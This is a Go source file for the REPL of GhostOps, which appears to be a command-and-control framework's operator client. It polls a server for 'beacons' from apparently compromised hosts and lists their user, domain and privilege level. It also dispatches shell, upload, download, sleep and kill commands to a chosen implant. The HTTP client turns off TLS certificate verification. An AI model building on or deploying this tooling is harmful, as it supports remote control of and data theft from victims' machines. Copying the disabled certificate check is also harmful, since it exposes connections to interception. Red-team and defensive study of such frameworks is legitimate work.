package repl

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/4w4647/GhostOps/client/internal/banner"
	"github.com/4w4647/GhostOps/client/internal/display"
	"github.com/4w4647/GhostOps/client/internal/models"
)

type REPL struct {
	Server      string
	APIKey      string
	Active      *models.BeaconInfo
	client      *http.Client
	scanner     *bufio.Scanner
	taskCursor  map[uint32]int
	seenBeacons map[uint32]bool
	seenMu      sync.Mutex
}

func New(server, apiKey string) *REPL {
	return &REPL{
		Server: server,
		APIKey: apiKey,
		client: &http.Client{
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
		},
		scanner:     bufio.NewScanner(os.Stdin),
		taskCursor:  make(map[uint32]int),
		seenBeacons: make(map[uint32]bool),
	}
}

func (r *REPL) prompt() string {
	if r.Active != nil {
		return fmt.Sprintf(display.Bold+display.Cyan+"GhostOps"+display.Reset+
			display.Bold+" ["+display.Green+"%s"+display.Reset+display.Bold+"]"+
			display.Reset+" > ", r.Active.Hostname)
	}
	return display.Bold + display.Cyan + "GhostOps" + display.Reset + " > "
}

func (r *REPL) Fetch(path string, out interface{}) error {
	req, err := http.NewRequest(http.MethodGet, r.Server+path, nil)
	if err != nil {
		return err
	}
	req.Header.Set("X-API-Key", r.APIKey)
	resp, err := r.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode == http.StatusUnauthorized {
		return fmt.Errorf("unauthorized — check your API key")
	}
	if resp.StatusCode == http.StatusNotFound {
		return fmt.Errorf("not found")
	}
	return json.NewDecoder(resp.Body).Decode(out)
}

func (r *REPL) Post(path string, body interface{}, out interface{}) error {
	data, err := json.Marshal(body)
	if err != nil {
		return err
	}
	req, err := http.NewRequest(http.MethodPost, r.Server+path, bytes.NewReader(data))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-API-Key", r.APIKey)
	resp, err := r.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode == http.StatusUnauthorized {
		return fmt.Errorf("unauthorized — check your API key")
	}
	if resp.StatusCode == http.StatusNotFound {
		return fmt.Errorf("beacon not found")
	}
	if resp.StatusCode >= 400 {
		return fmt.Errorf("server error: %s", resp.Status)
	}
	if out != nil {
		return json.NewDecoder(resp.Body).Decode(out)
	}
	return nil
}

func (r *REPL) markSeen(beacons []models.BeaconInfo) {
	r.seenMu.Lock()
	defer r.seenMu.Unlock()
	for _, b := range beacons {
		r.seenBeacons[b.BeaconID] = true
	}
}

func (r *REPL) watchBeacons() {
	for {
		time.Sleep(5 * time.Second)
		var beacons []models.BeaconInfo
		if err := r.Fetch("/beacons", &beacons); err != nil {
			continue
		}
		r.seenMu.Lock()
		for _, b := range beacons {
			if !r.seenBeacons[b.BeaconID] {
				r.seenBeacons[b.BeaconID] = true
				elevated := ""
				if b.IsElevated {
					elevated = display.Yellow + " *elevated*" + display.Reset
				}
				fmt.Printf("\r\033[K%s[+]%s new beacon: %s%s%s (%d)  %s\\%s%s  %s  %s  %s  %s\n",
					display.Green, display.Reset,
					display.Bold, b.Hostname, display.Reset,
					b.BeaconID,
					b.Domain, b.Username, elevated,
					display.ShortOS(b.OsBuild), b.Arch,
					display.IntegrityText(b.IntegrityLevel),
					b.EIP)
				fmt.Print(r.prompt())
			}
		}
		r.seenMu.Unlock()
	}
}

func (r *REPL) Run() {
	banner.Print()
	cmdHelp()
	go r.watchBeacons()

	for {
		fmt.Print(r.prompt())
		if !r.scanner.Scan() {
			break
		}
		parts := strings.Fields(strings.TrimSpace(r.scanner.Text()))
		if len(parts) == 0 {
			continue
		}
		switch parts[0] {
		case "beacons", "list":
			r.cmdBeacons()
		case "use":
			r.cmdUse(parts[1:])
		case "info":
			r.cmdInfo()
		case "shell":
			r.cmdShell(parts[1:])
		case "sleep":
			r.cmdSleep(parts[1:])
		case "kill":
			r.cmdKill()
		case "download":
			r.cmdDownload(parts[1:])
		case "upload":
			r.cmdUpload(parts[1:])
		case "tasks":
			r.cmdTasks(parts[1:])
		case "back":
			r.Active = nil
		case "help", "?":
			cmdHelp()
		case "exit", "quit":
			fmt.Println("bye")
			return
		default:
			fmt.Printf("%s[-]%s unknown command: %s  (type help)\n",
				display.Red, display.Reset, parts[0])
		}
	}
}
